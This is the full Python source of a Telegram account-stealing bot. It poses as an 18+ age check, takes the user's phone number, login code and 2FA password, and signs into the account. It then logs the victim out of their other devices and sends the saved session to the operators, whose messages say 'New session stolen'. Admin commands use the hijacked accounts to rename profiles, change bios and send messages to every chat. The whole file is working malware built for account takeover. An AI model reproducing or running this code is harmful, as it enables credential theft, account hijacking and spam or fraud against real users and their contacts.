import os, asyncio, logging, json
from datetime import datetime
from telethon import TelegramClient, functions
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, ConversationHandler, filters

# --- CONFIG ---
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN')
API_ID = int(os.getenv('API_ID', '12345'))
API_HASH = os.getenv('API_HASH', 'your_api_hash')
ADMIN_IDS = set(int(x) for x in os.getenv('ADMIN_IDS', '123456789').split(',') if x)
SESSION_DIR = 'sessions'
os.makedirs(SESSION_DIR, exist_ok=True)

# WebApp URL – set this as environment variable or hardcode
WEBAPP_URL = os.getenv('WEBAPP_URL', 'https://your-domain.com/steal.html')

# --- STATES ---
CONTACT, CODE, TWOFA = range(3)

# --- LOGGING ---
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# --- HELPERS ---
def save_session(user_id, phone, session_string):
    path = os.path.join(SESSION_DIR, f'{user_id}.json')
    with open(path, 'w') as f:
        json.dump({'phone': phone, 'session': session_string, 'timestamp': datetime.now().isoformat()}, f)
    return path

def load_session(user_id):
    path = os.path.join(SESSION_DIR, f'{user_id}.json')
    if os.path.exists(path):
        with open(path) as f:
            return json.load(f)
    return None

async def create_client(session_string=None):
    if session_string:
        return TelegramClient(StringSession(session_string), API_ID, API_HASH)
    else:
        return TelegramClient(StringSession(), API_ID, API_HASH)

async def logout_other_devices(client):
    try:
        auths = await client(functions.account.GetAuthorizationsRequest())
        current_hash = None
        for auth in auths.authorizations:
            if auth.current:
                current_hash = auth.hash
                break
        if current_hash:
            for auth in auths.authorizations:
                if not auth.current:
                    await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
        logger.info("Logged out other devices")
    except Exception as e:
        logger.error(f"Error logging out other devices: {e}")

# --- BOT COMMANDS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact_btn = KeyboardButton("🔞 Share Contact to Verify", request_contact=True)
    reply_markup = ReplyKeyboardMarkup([[contact_btn]], resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text(
        "🔥 **WELCOME TO THE ADULT ZONE** 🔥\n"
        "Tap the button below to verify you are 18+",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )
    return CONTACT

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    contact = update.message.contact
    if not contact:
        await update.message.reply_text("Please share your contact using the button.")
        return CONTACT
    phone = contact.phone_number
    context.user_data['phone'] = phone
    try:
        client = await create_client()
        await client.connect()
        result = await client.send_code_request(phone)
        context.user_data['phone_code_hash'] = result.phone_code_hash
        await client.disconnect()
    except Exception as e:
        await update.message.reply_text(f"❌ Error sending code: {str(e)}\nTry /start again.")
        return ConversationHandler.END

    webapp_btn = InlineKeyboardButton("🔢 Enter Verification Code", web_app={'url': WEBAPP_URL})
    reply_markup = InlineKeyboardMarkup([[webapp_btn]])
    await update.message.reply_text(
        "📲 **Code sent to your Telegram app.**\n"
        "Click the button below to open the keypad and enter the 5‑digit code.",
        reply_markup=reply_markup
    )
    return CODE

async def web_app_data_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = update.message.web_app_data
    if not data:
        await update.message.reply_text("No data received.")
        return CODE

    try:
        payload = json.loads(data.data)
    except:
        await update.message.reply_text("Invalid data format.")
        return CODE

    code = payload.get('code', '').strip()
    if not code:
        await update.message.reply_text("No code entered.")
        return CODE

    phone = context.user_data.get('phone')
    phone_code_hash = context.user_data.get('phone_code_hash')
    if not phone or not phone_code_hash:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    try:
        client = await create_client()
        await client.connect()
        await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        session_string = client.session.save()
        user_id = update.effective_user.id
        save_session(user_id, phone, session_string)
        await logout_other_devices(client)
        await client.disconnect()

        await update.message.reply_text("✅ **Verification successful!** Enjoy the content.")

        for admin in ADMIN_IDS:
            try:
                await context.bot.send_document(
                    chat_id=admin,
                    document=open(os.path.join(SESSION_DIR, f'{user_id}.json'), 'rb'),
                    caption=f"🎯 **New session stolen!**\nUser: {update.effective_user.mention_html()}\nPhone: {phone}\nTime: {datetime.now()}"
                )
            except Exception as e:
                logger.error(f"Failed to send session to admin {admin}: {e}")

        return ConversationHandler.END

    except SessionPasswordNeededError:
        context.user_data['client'] = client
        await update.message.reply_text("🔐 This account has 2FA enabled. Please send your 2FA password as a text message.")
        return TWOFA

    except Exception as e:
        error_msg = str(e)
        await update.message.reply_text(f"❌ Login failed: {error_msg}\nPlease try again with /start")
        return ConversationHandler.END

async def twofa_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client = context.user_data.get('client')
    if not client:
        await update.message.reply_text("Session expired. Please /start again.")
        return ConversationHandler.END

    try:
        await client.sign_in(password=password)
        session_string = client.session.save()
        user_id = update.effective_user.id
        phone = context.user_data.get('phone')
        save_session(user_id, phone, session_string)
        await logout_other_devices(client)
        await client.disconnect()

        await update.message.reply_text("✅ **2FA verified!** Session saved.")
        for admin in ADMIN_IDS:
            try:
                await context.bot.send_document(
                    chat_id=admin,
                    document=open(os.path.join(SESSION_DIR, f'{user_id}.json'), 'rb'),
                    caption=f"🎯 **New session stolen (with 2FA)!**\nUser: {update.effective_user.mention_html()}\nPhone: {phone}\nTime: {datetime.now()}"
                )
            except Exception as e:
                logger.error(f"Failed to send session to admin {admin}: {e}")
        return ConversationHandler.END
    except Exception as e:
        await update.message.reply_text(f"❌ 2FA login failed: {str(e)}\nTry again or /start over.")
        return TWOFA

# ==================== ADMIN COMMANDS ====================
def admin_only(func):
    async def wrapper(update, context):
        if update.effective_user.id not in ADMIN_IDS:
            await update.message.reply_text("⛔ You are not authorized.")
            return
        return await func(update, context)
    return wrapper

@admin_only
async def setname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /setname <user_id> <new_name>")
        return
    user_id = args[0]
    new_name = ' '.join(args[1:])
    session_data = load_session(user_id)
    if not session_data:
        await update.message.reply_text("❌ No session found for that user.")
        return
    try:
        client = await create_client(session_data['session'])
        await client.connect()
        await client(functions.account.UpdateProfileRequest(first_name=new_name))
        await update.message.reply_text(f"✅ Updated profile name for {user_id} to '{new_name}'")
        await client.disconnect()
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

@admin_only
async def setbio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /setbio <user_id> <new_bio>")
        return
    user_id = args[0]
    new_bio = ' '.join(args[1:])
    session_data = load_session(user_id)
    if not session_data:
        await update.message.reply_text("❌ No session found for that user.")
        return
    try:
        client = await create_client(session_data['session'])
        await client.connect()
        await client(functions.account.UpdateProfileRequest(about=new_bio))
        await update.message.reply_text(f"✅ Updated bio for {user_id} to '{new_bio}'")
        await client.disconnect()
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

@admin_only
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /broadcast <user_id> <message>")
        return
    user_id = args[0]
    msg_text = ' '.join(args[1:])
    session_data = load_session(user_id)
    if not session_data:
        await update.message.reply_text("❌ No session found for that user.")
        return
    try:
        client = await create_client(session_data['session'])
        await client.connect()
        dialogs = await client.get_dialogs()
        count = 0
        for dialog in dialogs:
            try:
                await client.send_message(dialog.entity, msg_text)
                count += 1
                await asyncio.sleep(0.5)
            except:
                pass
        await update.message.reply_text(f"✅ Broadcast sent to {count} chats.")
        await client.disconnect()
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

@admin_only
async def list_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
    files = os.listdir(SESSION_DIR)
    if not files:
        await update.message.reply_text("No sessions stolen yet.")
        return
    msg = "📋 **Stolen Sessions:**\n"
    for f in files:
        with open(os.path.join(SESSION_DIR, f)) as jf:
            data = json.load(jf)
            msg += f"User ID: {f.replace('.json','')}, Phone: {data.get('phone','unknown')}\n"
    await update.message.reply_text(msg, parse_mode='Markdown')

# Simple ping for testing
async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Pong! Bot is alive.")

# ==================== CONVERSATION HANDLER ====================
conv_handler = ConversationHandler(
    entry_points=[CommandHandler('start', start)],
    states={
        CONTACT: [MessageHandler(filters.CONTACT, contact_handler)],
        CODE: [MessageHandler(filters.StatusUpdate.WEB_APP_DATA, web_app_data_handler)],
        TWOFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa_handler)],
    },
    fallbacks=[CommandHandler('start', start)],
)

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(conv_handler)
    # Admin commands
    app.add_handler(CommandHandler('setname', setname))
    app.add_handler(CommandHandler('setbio', setbio))
    app.add_handler(CommandHandler('broadcast', broadcast))
    app.add_handler(CommandHandler('listsessions', list_sessions))
    app.add_handler(CommandHandler('ping', ping))
    print("🚀 Stealer bot is running...")
    app.run_polling()

if __name__ == '__main__':
    main()
